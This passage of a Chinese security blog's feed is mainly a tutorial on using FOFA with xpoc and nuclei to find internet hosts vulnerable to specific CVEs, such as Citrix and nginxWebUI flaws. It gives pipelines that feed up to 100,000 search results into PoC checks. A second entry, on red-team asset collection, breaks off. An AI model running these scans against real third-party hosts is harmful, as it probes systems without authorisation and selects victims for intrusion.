    <category term="情报" scheme="http://example.com/categories/%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="漏洞情报收集" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>漏洞poc快速查找利用</title>
    <link href="http://example.com/google/a0eb40eb.html"/>
    <id>http://example.com/google/a0eb40eb.html</id>
    <published>2024-09-19T13:56:11.000Z</published>
    <updated>2024-09-19T14:08:26.381Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>当爆破漏洞的时候，如何快速全网进行查找受害目标</p><blockquote><p>fofa（资产收集）</p><p>xpoc（poc验证）</p><p>nuclei（poc验证）【更新快，可自己写poc】</p></blockquote><p><a href="https://github.com/projectdiscovery/nuclei-templates">https://github.com/projectdiscovery/nuclei-templates</a></p><p><a href="https://nuclei-templates.netlify.app/#q=cve-2023">Nuclei Templates Directory</a></p><p>:::success<br>下面就从安装到快速使用写一篇，当然，只扫poc，不打exp</p><p>:::</p><h2 id="R5MSt">fofa sdk</h2><h3 id="LoUkP">为什么要安装fofa sdk</h3><h4 id="QJqJh">页面下载的场景和限制</h4>> 对于没有实时要求，需要大数据量一次性获取的用户来说，页面下载是最稳定的一种方式。满足最高单次1000万数据量的下载，一键直接下载获取大数据。1000万条数据时间大约需要1小时40分钟，以压缩包的形式获取。他相对而言时间比较久，但更为稳定。注：当导出的字段包含banner/header/cert/body/structinfo/icon这种大字段的时候，最多支持单次10万条数据下载。><h4 id="HWK9D">sdk下载的场景和限制（大量的数据一次性下载）</h4>> 但是当你需要的是接入程序的大数据量批量实时获取时，Search After接口可以作为你的选择。>> 当针对同一搜索语句进行大规模数据获取时，可使用连续翻页接口。该接口可以持续获取所有数据，支持失败重试，无需担心数据错位。>> 这个接口和基础接口的区别在于，不使用page进行翻页，引入nextid进行翻页。每次相应结果中会返回此值，不回传nextid时，默认返回第一页数据。><h4 id="ORTu6">官方API文档地址：</h4>[FOFA API Document](https://en.fofa.info/api)<h3 id="zQhRc">安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install fofa-py</span><br><span class="line">然后把mail和key放到环境变量里面</span><br><span class="line"><span class="built_in">export</span> FOFA_EMAIL=<span class="string">&quot;xxx@qq.com&quot;</span></span><br><span class="line"><span class="built_in">export</span> FOFA_KEY=<span class="string">&quot;b3axxxxx66b&quot;</span></span><br></pre></td></tr></table></figure><h3 id="WhSVp">使用</h3>这里只列举我们需要使用的<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fofa search <span class="string">&quot;查询语句&quot;</span> --count [查询总共有多少个资产]</span><br><span class="line">fofa search <span class="string">&quot;查询语句&quot;</span> -f ip,port,domain,<span class="built_in">link</span>,title,certs_match,certs_expired --size 5 【取出5个资产的ip,port,<span class="built_in">link</span>,title】</span><br><span class="line">fofa search <span class="string">&quot;查询语句&quot;</span> -f ip,port,domain,<span class="built_in">link</span>,title,certs_match,certs_expired --size 100000 --save test.csv [导出大量的资产到指定文件]</span><br></pre></td></tr></table></figure><h2 id="DoL8M">xpoc</h2>xpoc是封装的，所以直接下载二进制文件运行就行<ul><li>Github: <a href="https://github.com/chaitin/xpoc/releases">https://github.com/chaitin/xpoc/releases</a> （国外速度快）</li><li>CT stack: <a href="https://stack.chaitin.com/tool/detail?id=1036">https://stack.chaitin.com/tool/detail?id=1036</a> （国内速度快）</li></ul><h3 id="Jo91L">安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/chaitin/xpoc/releases/download/0.0.7/xpoc_darwin_amd64.zip --no-check-certificate</span><br></pre></td></tr></table></figure><h3 id="NNtyU">使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">拉取所有云端POC并扫描指定目标</span><br><span class="line"></span><br><span class="line">./xpoc -t https://example.com -html result.html</span><br><span class="line">查看所有云端的POC</span><br><span class="line"></span><br><span class="line">./xpoc list -a</span><br><span class="line">批量扫描</span><br><span class="line"></span><br><span class="line">./xpoc &lt; targets.txt</span><br><span class="line"><span class="built_in">cat</span> targets.txt | ./xpoc</span><br><span class="line">./xpoc -i targets.txt</span><br><span class="line">Top</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="t7Ies">添加软连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /Users/xxx/.xray/xpoc/xpoc /usr/local/bin/xpoc</span><br></pre></td></tr></table></figure><h2 id="cG47Q">nuclei</h2><h3 id="mQMFQ">安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nuclei需要go1.20才能安装成功。执行下列命令安装最新版本的Nuclei</span><br><span class="line"></span><br><span class="line">go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PsG2l">使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">Nuclei是一款注重于可配置性、可扩展性和易用性的基于模板的快速漏洞扫描器。</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">  nuclei [命令]</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">目标：</span><br><span class="line">   -u, -target string[]                  指定扫描的URL/主机</span><br><span class="line">   -l, -list string                      指定需要扫描的URL/主机文件（一行一个）</span><br><span class="line">   -resume string                        断点续扫（将禁用集群）</span><br><span class="line"></span><br><span class="line">模板：</span><br><span class="line">   -nt, -new-templates                   只扫描最新版本中添加的模板</span><br><span class="line">   -ntv, -new-templates-version string[] 运行在特定版本中添加的新模板</span><br><span class="line">   -as, -automatic-scan                  在自动web扫描中使用wappalyzer技术检测的指纹</span><br><span class="line">   -t, -templates string[]               指定需要扫描的模板或者模板的路径（逗号分隔，文件）</span><br><span class="line">   -tu, -template-url string[]           从URL加载模板（逗号分隔，文件）</span><br><span class="line">   -w, -workflows string[]               指定扫描中的工作流或者工作流目录（逗号分隔，文件）</span><br><span class="line">   -wu, -workflow-url string[]           从URL加载工作流（逗号分隔，文件）</span><br><span class="line">   -validate                             验证通过的模板</span><br><span class="line">   -nss, -no-strict-syntax               禁用模板的严格检查</span><br><span class="line">   -tl                                   列出所有可用的模板</span><br><span class="line"></span><br><span class="line">过滤：</span><br><span class="line">   -a, -author string[]                  执行指定作者的模板（逗号分隔，文件）</span><br><span class="line">   -tags string[]                        执行有标记的模板子集（逗号分隔，文件）</span><br><span class="line">   -etags, -exclude-tags string[]        执行标记为排除的模板（逗号分隔，文件）</span><br><span class="line">   -itags, -include-tags string[]        执行默认或者配置排除的标记模板</span><br><span class="line">   -<span class="built_in">id</span>, -template-id string[]            执行指定ID的模板（逗号分隔，文件）</span><br><span class="line">   -eid, -exclude-id string[]            执行排除指定ID的模板（逗号分隔，文件）</span><br><span class="line">   -it, -include-templates string[]      执行默认或配置中排除的模板</span><br><span class="line">   -et, -exclude-templates string[]      要排除的模板或者模板目录（逗号分隔，文件）</span><br><span class="line">   -em, -exclude-matchers string[]       在结果中排除指定模板</span><br><span class="line">   -s, -severity value[]                 根据严重程度运行模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -es, -exclude-severity value[]        根据严重程度排除模板，可候选的值有：info,low,medium,high,critical</span><br><span class="line">   -pt, -<span class="built_in">type</span> value[]                    根据协议运行模板，可候选的值有：dns, file, http, headless, network, workflow, ssl, websocket, whois</span><br><span class="line">   -ept, -exclude-type value[]           根据协议排除模板，可候选的值有：dns, file, http, headless, network, workflow, ssl, websocket, whois</span><br><span class="line">   -tc, -template-condition string[]      根据表达式运行模板</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">   -o, -output string                    输出发现的问题到文件</span><br><span class="line">   -sresp, -store-resp                   将nuclei的所有请求和响应输出到目录</span><br><span class="line">   -srd, -store-resp-dir string          将nuclei的所有请求和响应输出到指定目录（默认：output）</span><br><span class="line">   -silent                               只显示结果</span><br><span class="line">   -nc, -no-color                        禁用输出内容着色（ANSI转义码）</span><br><span class="line">   -j, -jsonl                            输出为jsonL（ines）</span><br><span class="line">   -irr, -include-rr                     在JSONL中输出对应的请求和相应（仅结果）</span><br><span class="line">   -nm, -no-meta                         不显示匹配的元数据</span><br><span class="line">   -nts, -no-timestamp                   不在输出中显示时间戳</span><br><span class="line">   -rdb, -report-db string               本地的Nuclei结果数据库（始终使用该数据库保存结果）</span><br><span class="line">   -ms, -matcher-status                  显示匹配失败状态</span><br><span class="line">   -me, -markdown-export string          以markdown导出结果</span><br><span class="line">   -se, -sarif-export string             以SARIF导出结果</span><br><span class="line"></span><br><span class="line">配置：</span><br><span class="line">   -config string                        指定Nuclei的配置文件</span><br><span class="line">   -fr, -follow-redirects                为HTTP模板启用重定向</span><br><span class="line">   -fhr, -follow-host-redirects          在同一主机上重定向</span><br><span class="line">   -mr, -max-redirects int               HTTP模板最大重定向次数（默认：10）</span><br><span class="line">   -dr, -disable-redirects               为HTTP模板禁用重定向</span><br><span class="line">   -rc, -report-config string            指定Nuclei报告模板文件</span><br><span class="line">   -H, -header string[]                  指定header、cookie，以header:value的方式（cli，文件）</span><br><span class="line">   -V, -var value                        通过key=value指定var值</span><br><span class="line">   -r, -resolvers string                 指定Nuclei的解析文件</span><br><span class="line">   -sr, -system-resolvers                当DNS错误时使用系统DNS</span><br><span class="line">   -passive                              启用被动扫描处理HTTP响应</span><br><span class="line">   -ev, env-vars                         在模板中使用环境变量</span><br><span class="line">   -cc, -client-cert string              用于对扫描的主机进行身份验证的客户端证书文件（PEM 编码）</span><br><span class="line">   -ck, -client-key string               用于对扫描的主机进行身份验证的客户端密钥文件（PEM 编码）</span><br><span class="line">   -ca, -client-ca string                用于对扫描的主机进行身份验证的客户端证书颁发机构文件（PEM 编码）</span><br><span class="line">   -sml, -show-match-line                显示文件模板的匹配值，只适用于提取器</span><br><span class="line">   -ztls                                 对ztls自动退回到tls13</span><br><span class="line">   -sni string                           指定tls sni的主机名（默认为输入的域名）</span><br><span class="line">   -i, -interface string                 指定网卡</span><br><span class="line">   -sip, -source-ip string               指定源IP</span><br><span class="line">   -config-directory string              重写默认配置路径（<span class="variable">$home</span>/.config）</span><br><span class="line">   -rsr, -response-size-read int         最大读取响应大小（默认：10485760字节）</span><br><span class="line">   -rss, -response-size-save int         最大储存响应大小（默认：10485760字节）</span><br><span class="line"></span><br><span class="line">交互：</span><br><span class="line">   -inserver, -ineractsh-server string   使用interactsh反连检测平台（默认为oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me）</span><br><span class="line">   -itoken, -interactsh-token string     指定反连检测平台的身份凭证</span><br><span class="line">   -interactions-cache-size int          指定保存在交互缓存中的请求数（默认：5000）</span><br><span class="line">   -interactions-eviction int            从缓存中删除请求前等待的时间（默认为60秒）</span><br><span class="line">   -interactions-poll-duration int       每个轮询前等待时间（默认为5秒）</span><br><span class="line">   -interactions-cooldown-period int     退出轮询前的等待时间（默认为5秒）</span><br><span class="line">   -ni, -no-interactsh                   禁用反连检测平台，同时排除基于反连检测的模板</span><br><span class="line"></span><br><span class="line">限速：</span><br><span class="line">   -rl, -rate-limit int                  每秒最大请求量（默认：150）</span><br><span class="line">   -rlm, -rate-limit-minute int          每分钟最大请求量</span><br><span class="line">   -bs, -bulk-size int                   每个模板最大并行检测数（默认：25）</span><br><span class="line">   -c, -concurrency int                  并行执行的最大模板数量（默认：25）</span><br><span class="line">   -hbs, -headless-bulk-size int         每个模板并行运行的无头主机最大数量（默认：10）</span><br><span class="line">   -headc, -headless-concurrency int     并行指定无头主机最大数量（默认：10）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优化：</span><br><span class="line">   -<span class="built_in">timeout</span> int                          超时时间（默认为10秒）</span><br><span class="line">   -retries int                          重试次数（默认：1）</span><br><span class="line">   -ldp, -leave-default-ports            指定HTTP/HTTPS默认端口（例如：host:80，host:443）</span><br><span class="line">   -mhe, -max-host-error int             某主机扫描失败次数，跳过该主机（默认：30）</span><br><span class="line">   -te, -track-error string[]            将给定错误添加到最大主机错误监视列表（标准、文件）</span><br><span class="line">   -nmhe, -no-mhe                        <span class="built_in">disable</span> skipping host from scan based on errors</span><br><span class="line">   -project                              使用项目文件夹避免多次发送同一请求</span><br><span class="line">   -project-path string                  设置特定的项目文件夹</span><br><span class="line">   -spm, -stop-at-first-path             得到一个结果后停止（或许会中断模板和工作流的逻辑）</span><br><span class="line">   -stream                               流模式 - 在不整理输入的情况下详细描述</span><br><span class="line">   -irt, -input-read-timeout duration    输入读取超时时间（默认：3分钟）</span><br><span class="line">   -no-stdin                             禁用标准输入</span><br><span class="line"></span><br><span class="line">无界面浏览器：</span><br><span class="line">    -headless                            启用需要无界面浏览器的模板</span><br><span class="line">    -page-timeout int                    在无界面下超时秒数（默认：20）</span><br><span class="line">    -sb, -show-brower                    在无界面浏览器运行模板时，显示浏览器</span><br><span class="line">    -sc, -system-chrome                  不使用Nuclei自带的浏览器，使用本地浏览器</span><br><span class="line">    -lha, -list-headless-action          列出可用的无界面操作</span><br><span class="line"></span><br><span class="line">调试：</span><br><span class="line">    -debug                               显示所有请求和响应</span><br><span class="line">    -dreq, -debug-req                    显示所有请求</span><br><span class="line">    -dresp, -debug-resp                  显示所有响应</span><br><span class="line">    -p, -proxy string[]                  使用http/socks5代理（逗号分隔，文件）</span><br><span class="line">    -pi, -proxy-internal                 代理所有请求</span><br><span class="line">    -ldf, -list-dsl-function             列出所有支持的DSL函数签名</span><br><span class="line">    -tlog, -trace-log string             写入跟踪日志到文件</span><br><span class="line">    -elog, -error-log string             写入错误日志到文件</span><br><span class="line">    -version                             显示版本信息</span><br><span class="line">    -hm, -hang-monitor                   启用Nuclei的监控</span><br><span class="line">    -v, -verbose                         显示详细信息</span><br><span class="line">    -profile-mem string                  将Nuclei的内存转储成文件</span><br><span class="line">    -vv                                  显示额外的详细信息</span><br><span class="line">    -ep, -enable-pprof                   启用pprof调试服务器</span><br><span class="line">    -tv, -templates-version              显示已安装的模板版本</span><br><span class="line">    -hc, -health-check                   运行诊断检查</span><br><span class="line"></span><br><span class="line">升级：</span><br><span class="line">    -update                              更新Nuclei到最新版本</span><br><span class="line">    -ut, -update-templates               更新Nuclei模板到最新版</span><br><span class="line">    -ud, -update-directory string        覆盖安装模板</span><br><span class="line">    -duc, -disable-update-check          禁用更新</span><br><span class="line"></span><br><span class="line">统计：</span><br><span class="line">    -stats                               显示正在扫描的统计信息</span><br><span class="line">    -sj, -stats-json                     将统计信息以JSONL格式输出到文件</span><br><span class="line">    -si, -stats-inerval int              显示统计信息更新的间隔秒数（默认：5）</span><br><span class="line">    -m, -metrics                         显示Nuclei端口信息</span><br><span class="line">    -mp, -metrics-port int               更改Nuclei默认端口（默认：9092）</span><br></pre></td></tr></table></figure><h3 id="kS4pJ">添加软连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /Users/xxx/nuclei /usr/local/bin/nuclei</span><br></pre></td></tr></table></figure><h2 id="kLEro">fofa联动xpoc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa search <span class="string">&quot;app=nginxwebui&quot;</span> -f <span class="built_in">link</span>, --size 5 | xpoc --run poc-yaml-nginxwebui-rce -o test.html</span><br></pre></td></tr></table></figure><p><img src="/google/a0eb40eb/xpocimg.png" alt="xpocimg.png"></p><h2 id="U9rGg">fofa联动nuclei</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa search <span class="string">&quot;app=citrix-Gateway || citrix-ADC&quot;</span> -f <span class="built_in">link</span>, --size 5 | grep -Eo <span class="string">&#x27;https?://[^\s]+&#x27;</span> | xargs -I &#123;&#125; nuclei -u &#123;&#125; -t http/cves/2023/CVE-2023-24488.yaml -silent</span><br></pre></td></tr></table></figure><p><img src="/google/a0eb40eb/nucleiimg.png"></p><h2 id="WWBak">FOFA 联动python脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa search <span class="string">&#x27;app=&quot;citrix-Gateway&quot; || app=&quot;citrix-ADC&quot;&#x27;</span> -f <span class="built_in">link</span>, --size 100000|grep -Eo <span class="string">&#x27;https?://[^\s]+&#x27;</span> | xargs -I &#123;&#125;  python3 cve_2023_3519_inspector.py -u &#123;&#125; |grep -E <span class="string">&#x27;VULNERABLE&#x27;</span> &gt;result.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="情报" scheme="http://example.com/categories/%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="poc收集" scheme="http://example.com/tags/poc%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>多目标场景如何快速收集所有100%控股的资产</title>
    <link href="http://example.com/google/be1fe7ba.html"/>
    <id>http://example.com/google/be1fe7ba.html</id>
    <published>2024-09-19T11:34:24.000Z</published>
    <updated>2024-09-19T11:49:53.954Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>hw中总是遇到N个目标的场景，一个个收集起来本就很难，</p><p>23年HW还要100%控股才可以，这样更难做</p><p>:::success<br>思路：</p><ol><li>备案查询</li><li>梳理全部根域名</li><li>fofa梭哈下载</li></ol><p>:::</p><h2 id="ABGTN">1.备案查询</h2>单个脚本（ICP_checker.py）：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> openpyxl <span class="keyword">as</span> xl</span><br><span class="line"><span class="keyword">from</span> openpyxl.styles <span class="keyword">import</span> Alignment</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;no_proxy&#x27;</span>] = <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_base</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;版本：V2.1.6 可用测试：2023-2-26\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;项目地址：https://github.com/wongzeon/ICP-Checker\n&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="built_in">input</span>(<span class="string">&quot;请完整输入公司全称 / 域名以查询备案信息：\n\n&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;https://www.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;http://www.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span 